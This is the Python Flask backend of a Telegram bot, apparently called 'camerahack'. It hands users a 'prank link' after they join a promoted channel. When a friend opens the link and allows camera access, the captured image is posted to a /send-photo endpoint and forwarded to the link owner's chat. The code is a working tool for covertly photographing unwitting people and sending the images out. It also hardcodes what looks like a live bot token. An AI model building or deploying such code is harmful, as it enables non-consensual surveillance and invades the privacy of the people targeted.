
from flask import Flask, request
from flask_cors import CORS
from telegram import Bot, Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Dispatcher, CommandHandler, CallbackQueryHandler
import telegram
import os
# === Configuration ===
BOT_TOKEN = '6515038883:AAF3LfbnrUcQBBWiSYs4qpjQCRNQWUAdG1o'  # Replace this
CHANNEL_USERNAME = '@freeinstagramfollowers_10'  # Replace this
FRONTEND_URL = 'https://hiwhoisthis.netlify.app/'  # Replace with your prank page

bot = Bot(token=BOT_TOKEN)
app = Flask(__name__)
CORS(app)

# Stores user_id to chat_id
user_links = {}

@app.route('/')
def home():
    return "✅ Flask is running"

@app.route('/send-photo', methods=['POST'])
def receive_photo():
    data = request.json
    user_id = str(data.get("user_id"))
    img_base64 = data.get("img_base64")
    chat_id = user_links.get(user_id)

    if chat_id and img_base64:
        try:
            bot.send_photo(
                chat_id=chat_id,
                photo=img_base64,
                caption="📸 Image captured from your prank link!"
            )
            return '✅ Photo sent', 200
        except Exception as e:
            return f'❌ Error: {str(e)}', 500
    return '❌ Invalid data', 400

def is_user_member(user_id):
    try:
        member = bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def send_prank_link(chat_id, name, user_id):
    prank_link = f"{FRONTEND_URL}/?userid={user_id}"
    user_links[str(user_id)] = chat_id
    bot.send_message(
        chat_id=chat_id,
        text=(
            f"🎉 Welcome {name}!\n\n"
            f"🔗 *Your prank link:*\n`{prank_link}`\n\n"
            "📤 Share this. If your friend opens it and allows camera access, you'll get their image 😄"
        ),
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 Open Link", url=prank_link)]
        ])
    )

def start(update: Update, context):
    user_id = update.effective_user.id
    name = update.effective_user.first_name
    update.message.reply_text(
        f"👋 Hello *{name}*, agree to continue?",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Accept & Continue", callback_data="accept_terms_start")]
        ])
    )

def accept_terms_start(update: Update, context):
    query = update.callback_query
    user_id = query.from_user.id
    name = query.from_user.first_name

    if is_user_member(user_id):
        send_prank_link(query.message.chat_id, name, user_id)
    else:
        query.message.reply_text(
            "🚫 Please join the channel first:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
                [InlineKeyboardButton("✅ I Joined", callback_data="check_join")]
            ])
        )

def check_join(update: Update, context):
    query = update.callback_query
    user_id = query.from_user.id
    name = query.from_user.first_name

    if is_user_member(user_id):
        send_prank_link(query.message.chat_id, name, user_id)
    else:
        query.message.reply_text("❌ Still not a member.")

@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def webhook():
    update = Update.de_json(request.get_json(force=True), bot)
    dispatcher.process_update(update)
    return 'OK'

def set_webhook():
    webhook_url = f"https://camerahack.onrender.com/{BOT_TOKEN}"  # Replace this
    bot.set_webhook(url=webhook_url)

if __name__ == '__main__':
    from telegram.ext import Dispatcher
    from telegram.ext import CallbackContext

    dispatcher = Dispatcher(bot, None, workers=0, use_context=True)
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CallbackQueryHandler(accept_terms_start, pattern="accept_terms_start"))
    dispatcher.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))

    set_webhook()
    app.run(host="0.0.0.0", port=8080)

